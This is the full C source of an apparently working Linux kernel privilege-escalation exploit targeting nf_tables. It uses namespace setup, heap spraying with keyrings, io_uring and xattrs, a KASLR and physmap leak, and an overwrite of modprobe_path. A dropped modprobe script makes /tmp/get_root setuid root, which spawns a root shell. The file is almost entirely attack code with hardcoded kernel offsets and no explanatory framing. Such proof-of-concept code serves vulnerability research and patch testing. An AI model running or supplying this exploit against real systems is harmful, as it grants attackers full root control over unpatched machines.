#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <linux/keyctl.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <sys/types.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <semaphore.h>
#include <sched.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/utsname.h>
#include <sys/syscall.h>
#include <linux/io_uring.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

void error(char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

#define FILENAME_MAX_LEN 0x80

void write_file(const char *filename, char *text) {
    int fd = open(filename, O_RDWR);
    write(fd, text, strlen(text));
    close(fd);
}

void new_ns(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    char buffer[0x100];

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS))
        error("unshare(CLONE_NEWUSER | CLONE_NEWNS)");

    if (unshare(CLONE_NEWNET))
        error("unshare(CLONE_NEWNET)");
    
    write_file("/proc/self/setgroups", "deny");

    snprintf(buffer, sizeof(buffer), "0 %d 1", uid);
    write_file("/proc/self/uid_map", buffer);
    snprintf(buffer, sizeof(buffer), "0 %d 1", gid);
    write_file("/proc/self/gid_map", buffer);
}

void set_cpu_affinity(int cpu_n, pid_t pid) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0)
        error("sched_setaffinity");
}

#define SPRAY_NB_ENTRIES 10

struct fd_uring {
    int fd;
    struct io_uring_params *params;
};

static inline int io_uring_setup(uint32_t entries, struct io_uring_params *p) {
    return syscall(__NR_io_uring_setup, entries, p);
}

static inline int io_uring_register(int fd, unsigned int opcode, void *arg, unsigned int nr_args) {
    return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);
}

void spray_uring(uint32_t spray_size, struct fd_uring *fd_buffer) {
    for (uint64_t i = 0; i < spray_size; i++) {
        fd_buffer[i].params = malloc(sizeof(struct io_uring_params));
        if (!fd_buffer[i].params)
            error("malloc");
        memset(fd_buffer[i].params, 0, sizeof(struct io_uring_params));

        fd_buffer[i].fd = io_uring_setup(SPRAY_NB_ENTRIES, fd_buffer[i].params);
        if (fd_buffer[i].fd < 0)
            error("io_uring_create");
    }
}

void release_uring(struct fd_uring *fd_buffer, uint32_t spray_size) {
    for (uint32_t i = 0; i < spray_size; i++) 
        close(fd_buffer[i].fd);
    free(fd_buffer);
}

#define XATTR_FILE "/tmp/tmpfs/a"
#define XATTR_VALUE "value"
#define XATTR_DELETION_NAME "security.Iwanttoberoot"

#define ATTRIBUTE_NAME_LEN 0x100
#define COMMAND_MAX_LEN 0x100
#define PREFIX_BUFFER_LEN 16

struct write4_payload {
    uint8_t prefix[PREFIX_BUFFER_LEN];
    void *next;
    void *prev;
    uint8_t name_offset;
} __attribute__((packed));

void create_xattr(const char *filename, char *attribute_name) {
    if (setxattr(filename, attribute_name, XATTR_VALUE, strlen(XATTR_VALUE), XATTR_CREATE) < 0)
        error("setxattr");
}

void spray_simple_xattr(char *filename, uint32_t spray_size) {
    char command[COMMAND_MAX_LEN];
    char attribute_name[ATTRIBUTE_NAME_LEN];

    if (mkdir("/tmp/tmpfs", S_IRWXU) == -1 && errno != EEXIST)
		error("mkdir");

    system("mount -t tmpfs none /tmp/tmpfs");
    
    int fd = creat(filename, 0644);
    close(fd);

    for (uint64_t i = 0; i < spray_size; i++) {
        snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%215lu-%s", i, XATTR_DELETION_NAME);
        create_xattr(filename, attribute_name);
    }
}

#define IO_RING_CTX_REF_FREE_OFFSET 0x61de60       
#define IO_RSRC_NODE_REF_ZERO_OFFSET 0x61fcd0       

#define KEY_DESC_MAX_SIZE 40
#define PREFIX_BUF_LEN 16
#define RCU_HEAD_LEN 16
#define SPRAY_KEY_SIZE 50

#define PHYSMAP_MASK 0xffffffff00000000

struct keyring_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    uint8_t rcu_buf[RCU_HEAD_LEN];  
    unsigned short len;             
};

struct leak {
    long kaslr_base;
    long physmap_base;
};

typedef int32_t key_serial_t;

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

key_serial_t *spray_keyring(uint32_t spray_size) {
    char key_desc[KEY_DESC_MAX_SIZE];
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    if (id_buffer == NULL)
        error("calloc");

    for (uint32_t i = 0; i < spray_size; i++) {
        snprintf(key_desc, KEY_DESC_MAX_SIZE, "RandoriSec-%03du", i);
        id_buffer[i] = add_key("user", key_desc, key_desc, strlen(key_desc), KEY_SPEC_PROCESS_KEYRING);
        if (id_buffer[i] < 0)
            error("add_key");
    }
 
    return id_buffer;
}

struct leak *parse_leak(long *buffer, uint32_t buffer_size) {
    struct leak *ret = malloc(sizeof(struct leak));
    if (!ret)
        error("malloc");

    for (uint32_t i = 0; i < buffer_size; i++) {
        if ((buffer[i] & 0xfffff) == (IO_RING_CTX_REF_FREE_OFFSET & 0xfffff)) {
            ret->kaslr_base = buffer[i] - IO_RING_CTX_REF_FREE_OFFSET;
            ret->physmap_base = buffer[i + 5] & PHYSMAP_MASK;
            return ret;
        }
        else if ((buffer[i] & 0xfffff) == (IO_RSRC_NODE_REF_ZERO_OFFSET & 0xfffff)) {
            ret->kaslr_base = buffer[i] - IO_RSRC_NODE_REF_ZERO_OFFSET;
            ret->physmap_base = buffer[i + 5] & PHYSMAP_MASK;
            return ret;
        }
    }

    free(ret);
    return NULL;
}

void print_hex( char *buf,int size){
    int i;
    puts("======================================");
    printf("data :\n");
    for (i=0 ; i<(size/8);i++){
        if (i%2 == 0){
            printf("%d",i/2);
        }
        printf(" %16llx",*(size_t * )(buf + i*8));
        if (i%2 == 1){
            printf("\n");
        }       
    }
    puts("======================================");
}

struct leak *get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    uint8_t buffer[USHRT_MAX] = {0};
    int32_t keylen;

    for (uint32_t i = 0; i < id_buffer_size; i++) {
        keylen = keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, USHRT_MAX, 0);
        if (keylen < 0)
            error("keyctl");

        if (keylen == USHRT_MAX)    
        {
            return parse_leak((long *)buffer, keylen >> 3);
        }
    }
    return NULL;
}

void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    for (uint32_t i = 0; i < id_buffer_size; i++) 
        if (keyctl(KEYCTL_REVOKE, id_buffer[i], 0, 0, 0) < 0)
            error("keyctl(KEYCTL_REVOKE)");

    free(id_buffer);
}

const char dummy_file[] = "/tmp/dummy\0";
const char dummy_content[] = "\xff\xff\xff\xff";
const char new_modprobe_content[] = "#!/bin/sh\n\nchown root:root /tmp/get_root\nchmod 4555 /tmp/get_root\n";

sem_t *shell_barrier;

void prepare_root_shell(void) {
    int shmid = shmget(0x1337, sizeof(sem_t), IPC_CREAT | S_IRWXU | S_IRWXG | S_IRWXO);
    shell_barrier = shmat(shmid, NULL, 0);

    if (sem_init(shell_barrier, 1, 0) < 0)
        error("sem_init");

    if (!fork()) {
        system("cp ./get_root /tmp");
        sem_wait(shell_barrier);
        system("/tmp/get_root");
        exit(EXIT_SUCCESS);
    }
}

void create_dummy_file(void) {
    int fd;
    fd = open(dummy_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    write(fd, dummy_content, sizeof(dummy_content));
    close(fd);
}

char *get_new_modprobe_path(void) {
    int fd;
    char *modprobe_path = malloc(15);
    if (!modprobe_path)
        error("malloc");

    fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0)
        error("open(/proc/sys/kernel/modprobe)");

    read(fd, modprobe_path, 14);
    close(fd);

    modprobe_path[14] = '\0';
    return modprobe_path;
}

void write_new_modprobe(char *filename) {
    int fd;
    fd = open(filename, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    if (fd < 0)
        error("open");

    write(fd, new_modprobe_content, sizeof(new_modprobe_content));
    close(fd);
}

void setup_modprobe_payload(void) {
    char *filename;
    filename = get_new_modprobe_path();

    write_new_modprobe(filename);
    create_dummy_file();

    free(filename);
}

void get_root_shell(void) {
		execve("/tmp/dummy", NULL, NULL);
    sem_post(shell_barrier);
}

#define NETLINK_RECEIVE_BUFFER_SIZE 4096

#define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
#define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
#define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
#define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
#define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)
#define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + S8_NLA_SIZE)

struct nlmsghdr *get_batch_begin_nlmsg(void) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
    struct nfgenmsg *nfgm = (struct nfgenmsg *)NLMSG_DATA(nlh);
    if (!nlh)
        error("malloc");

    memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
    nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
    nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = 0;
    nlh->nlmsg_seq = 0;

    nfgm->res_id = NFNL_SUBSYS_NFTABLES;

    return nlh;
}

struct nlmsghdr *get_batch_end_nlmsg(void) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
    if (!nlh)
        error("malloc");

    memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
    nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
    nlh->nlmsg_type = NFNL_MSG_BATCH_END;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;

    return nlh;
}

struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type, uint16_t data_len) {
    attr->nla_type = type;
    attr->nla_len = NLA_ALIGN(data_len + sizeof(struct nlattr));
    return (void *)attr + sizeof(struct nlattr);
}

struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type, uint32_t value) {
    attr->nla_type = type;
    attr->nla_len = U32_NLA_SIZE;
    *(uint32_t *)NLA_ATTR(attr) = htonl(value);

    return (void *)attr + U32_NLA_SIZE;
}

struct nlattr *set_u64_attr(struct nlattr *attr, uint16_t type, uint64_t value) {
    attr->nla_type = type;
    attr->nla_len = U64_NLA_SIZE;
    *(uint64_t *)NLA_ATTR(attr) = htobe64(value);

    return (void *)attr + U64_NLA_SIZE;
}

struct nlattr *set_str8_attr(struct nlattr *attr, uint16_t type, const char name[8]) {
    attr->nla_type = type;
    attr->nla_len = S8_NLA_SIZE;
    memcpy(NLA_ATTR(attr), name, 8);

    return (void *)attr + S8_NLA_SIZE;
}

struct nlattr *set_binary_attr(struct nlattr *attr, uint16_t type, uint8_t *buffer, uint64_t buffer_size) {
    attr->nla_type = type;
    attr->nla_len = NLA_BIN_SIZE(buffer_size);
    memcpy(NLA_ATTR(attr), buffer, buffer_size);

    return (void *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));
}

#define KMALLOC64_KEYLEN (64 - 8 - 12 - 16) 

const uint8_t zerobuf[0x40] = {0};

void create_table(int sock, const char *name) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    nlh_batch_begin = get_batch_begin_nlmsg();

    nlh = (struct nlmsghdr *)malloc(TABLEMSG_SIZE);
    if (!nlh)
        error("malloc");

    memset(nlh, 0, TABLEMSG_SIZE);
    nlh->nlmsg_len = TABLEMSG_SIZE;
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;

    nfm = NLMSG_DATA(nlh);
    nfm->nfgen_family = NFPROTO_INET;

    attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
    set_str8_attr(attr, NFTA_TABLE_NAME, name);

    nlh_batch_end = get_batch_end_nlmsg();

    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh;
    iov[1].iov_len = nlh->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    sendmsg(sock, &msg, 0);

    free(nlh_batch_end);
    free(nlh);
    free(nlh_batch_begin);
}

void create_set(int sock, const char *set_name, uint32_t set_keylen, uint32_t data_len, const char *table_name, uint32_t id) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_payload;
    struct nlmsghdr *nlh_batch_end;
    struct nfgenmsg *nfm;
    struct nlattr *attr;
    uint64_t nlh_payload_size;
    struct iovec iov[3];

    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;

    nlh_batch_begin = get_batch_begin_nlmsg();

    nlh_payload_size = sizeof(struct nfgenmsg);     
    nlh_payload_size += S8_NLA_SIZE;                
    nlh_payload_size += S8_NLA_SIZE;                
    nlh_payload_size += U32_NLA_SIZE;               
    nlh_payload_size += U32_NLA_SIZE;               
    nlh_payload_size += U32_NLA_SIZE;               
    nlh_payload_size += U32_NLA_SIZE;               
    nlh_payload_size += U32_NLA_SIZE;               
    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

    nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
    if (!nlh_payload)
        error("malloc");

    memset(nlh_payload, 0, nlh_payload_size);

    nlh_payload->nlmsg_len = nlh_payload_size;
    nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;
    nlh_payload->nlmsg_pid = getpid();
    nlh_payload->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh_payload->nlmsg_seq = 0;
    
    nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
    nfm->nfgen_family = NFPROTO_INET;

    attr = (struct nlattr *)((void *)nlh_payload + NLMSG_SPACE(sizeof(struct nfgenmsg)));
    attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
    attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
    attr = set_u32_attr(attr, NFTA_SET_ID, id);
    attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);
    attr = set_u32_attr(attr, NFTA_SET_FLAGS, NFT_SET_MAP);
    attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, 0);
    set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);

    nlh_batch_end = get_batch_end_nlmsg();

    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh_payload;
    iov[1].iov_len = nlh_payload->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    memset(&msg, 0, sizeof(struct msghdr));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    sendmsg(sock, &msg, 0);

    free(nlh_batch_end);
    free(nlh_payload);
    free(nlh_batch_begin);
}

void add_elem_to_set(int sock, const char *set_name, uint32_t set_keylen, const char *table_name, uint32_t id, uint32_t data_len, uint8_t *data) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_payload;
    struct nlmsghdr *nlh_batch_end;
    struct nfgenmsg *nfm;
    struct nlattr *attr;
    uint64_t nlh_payload_size;
    uint64_t nested_attr_size;
    size_t first_element_size;
    size_t second_element_size;
    struct iovec iov[3];

    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;

    nlh_batch_begin = get_batch_begin_nlmsg();

    nested_attr_size = 0;

    nested_attr_size += sizeof(struct nlattr);              
    nested_attr_size += sizeof(struct nlattr);              
    nested_attr_size += NLA_BIN_SIZE(set_keylen);           
    nested_attr_size += sizeof(struct nlattr);              
    nested_attr_size += NLA_ALIGN(NLA_BIN_SIZE(data_len));  
    first_element_size = nested_attr_size;

    nested_attr_size += sizeof(struct nlattr);              
    nested_attr_size += sizeof(struct nlattr);              
    nested_attr_size += NLA_BIN_SIZE(set_keylen);           
    nested_attr_size += sizeof(struct nlattr);              
    nested_attr_size += sizeof(struct nlattr);              
    nested_attr_size += U32_NLA_SIZE;                       
    second_element_size = nested_attr_size - first_element_size;

    nlh_payload_size = sizeof(struct nfgenmsg);             
    nlh_payload_size += sizeof(struct nlattr);              
    nlh_payload_size += nested_attr_size;                   
    nlh_payload_size += S8_NLA_SIZE;                        
    nlh_payload_size += S8_NLA_SIZE;                       
    nlh_payload_size += U32_NLA_SIZE;                       
    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

    nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
    if (!nlh_payload) 
        error("malloc");
    memset(nlh_payload, 0, nlh_payload_size);

    nlh_payload->nlmsg_len = nlh_payload_size;
    nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM;
    nlh_payload->nlmsg_pid = getpid();
    nlh_payload->nlmsg_flags = NLM_F_REQUEST;
    nlh_payload->nlmsg_seq = 0;

    nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
    nfm->nfgen_family = NFPROTO_INET;

    attr = (struct nlattr *)((void *)nlh_payload + NLMSG_SPACE(sizeof(struct nfgenmsg)));
    attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
    attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_SET, set_name);
    attr = set_u32_attr(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_LIST_ELEMENTS, nested_attr_size);

    attr = set_nested_attr(attr, 0, first_element_size - 4);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, NLA_BIN_SIZE(set_keylen));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)zerobuf, set_keylen);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, NLA_BIN_SIZE(data_len));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)data, data_len);

    attr = set_nested_attr(attr, 0, second_element_size - 4);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, NLA_BIN_SIZE(set_keylen));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)zerobuf, set_keylen);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, U32_NLA_SIZE + sizeof(struct nlattr));
    attr = set_nested_attr(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
    set_u32_attr(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);

    nlh_batch_end = get_batch_end_nlmsg();

    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh_payload;
    iov[1].iov_len = nlh_payload->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    memset(&msg, 0, sizeof(struct msghdr));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    sendmsg(sock, &msg, 0);

    free(nlh_batch_end);
    free(nlh_payload);
    free(nlh_batch_begin);
}

#define ID 1337
#define SET_NAME "name\0\0\0"
#define LEAK_SET_NAME "leak\0\0\0"
#define TABLE_NAME "table\0\0"

#define MODPROBE_PATH_BASE 0x1e91820 

#define SPRAY_SIZE 300

int main(int argc, char **argv) {
    int sock;
    struct sockaddr_nl snl;
    struct write4_payload payload;
    struct keyring_payload leak_payload;
    struct leak *bases;
    struct fd_uring *fd_buffer;
    key_serial_t *id_buffer;
    char xattr_target_filename[] = "/tmp/tmpfs/file0";  
    
    set_cpu_affinity(0, 0);

    prepare_root_shell();
    printf("[+] Second process currently waiting\n");

    new_ns();
    printf("[+] Get CAP_NET_ADMIN capability\n");

    if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) 
        error("socket");
    printf("[+] Netlink socket created\n");

    memset(&snl, 0, sizeof(snl));
    snl.nl_family = AF_NETLINK;
    snl.nl_pid = getpid();
    if (bind(sock, (struct sockaddr *)&snl, sizeof(snl)) < 0)
        error("bind");
    printf("[+] Netlink socket bound\n");

    create_table(sock, TABLE_NAME);
    printf("[+] Table %s created\n", TABLE_NAME);


    create_set(sock, LEAK_SET_NAME, KMALLOC64_KEYLEN, sizeof(struct keyring_payload), TABLE_NAME, ID);
    printf("[+] Set for the leak created\n");

    create_set(sock, SET_NAME, KMALLOC64_KEYLEN, sizeof(struct write4_payload), TABLE_NAME, ID + 1);
    printf("[+] Set for write primitive created\n");

    int try_num = 0; 
    memset(&leak_payload, 0, sizeof(struct keyring_payload));
    leak_payload.len = USHRT_MAX;
    fflush(stdout);
retry:

    id_buffer = spray_keyring(SPRAY_KEY_SIZE);

    add_elem_to_set(sock, LEAK_SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME, ID, sizeof(struct keyring_payload), (uint8_t *)&leak_payload);

    fd_buffer = calloc(SPRAY_SIZE, sizeof(struct fd_uring));    
    if (!fd_buffer)
        error("calloc");
    spray_uring(SPRAY_SIZE, fd_buffer);

    bases = get_keyring_leak(id_buffer, SPRAY_KEY_SIZE);
    if (!bases) {
        release_keys(id_buffer, SPRAY_KEY_SIZE);
        release_uring(fd_buffer, SPRAY_SIZE);
        printf("trying %d\n", try_num++);
        goto retry;
    }
    printf("\r[+] Leak succeed     \n");
    printf("[+] kaslr base found 0x%lx\n", bases->kaslr_base);
    printf("[+] physmap base found 0x%lx\n", bases->physmap_base);

    memset(&payload, 0, sizeof(struct write4_payload));
    payload.next = (void *)(bases->physmap_base + 0x2f706d74);      
    payload.prev = (void *)(bases->kaslr_base + MODPROBE_PATH_BASE + 1);
    payload.name_offset = 0xe5;             

respray_xattr:
    spray_simple_xattr(xattr_target_filename, SPRAY_SIZE);
    add_elem_to_set(sock, SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME, ID, sizeof(struct write4_payload), (uint8_t *)&payload);

    if (removexattr(xattr_target_filename, XATTR_DELETION_NAME) < 0)  
        goto respray_xattr;

    printf("[+] modprobe_path changed !\n");
    setup_modprobe_payload();
    printf("[+] Modprobe payload setup\n");
    get_root_shell();

    wait(NULL);
    return EXIT_SUCCESS;
}
